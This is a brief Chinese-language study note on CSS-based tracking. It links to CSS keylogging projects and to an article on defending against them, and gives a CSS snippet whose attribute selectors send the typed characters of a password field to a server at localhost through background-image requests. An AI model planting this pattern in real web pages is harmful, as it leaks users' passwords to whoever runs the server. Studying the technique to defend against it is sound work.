# css track

## 参考
- [CrookedStyleSheets](https://github.com/jbtronics/CrookedStyleSheets/blob/master/docs/README.zh.md)
- [介绍CSS-Keylogging](https://github.com/maxchehab/CSS-Keylogging)
- [防范CSS-Keylogging](https://juejin.im/post/5c2d68965188250baa55c3e2)

## 实例
```css
input[type="password"][value$="a"] {
  background-image: url("http://localhost:3000/a");
}
input[type="password"][value$="b"] {
  background-image: url("http://localhost:3000/b");
}
```
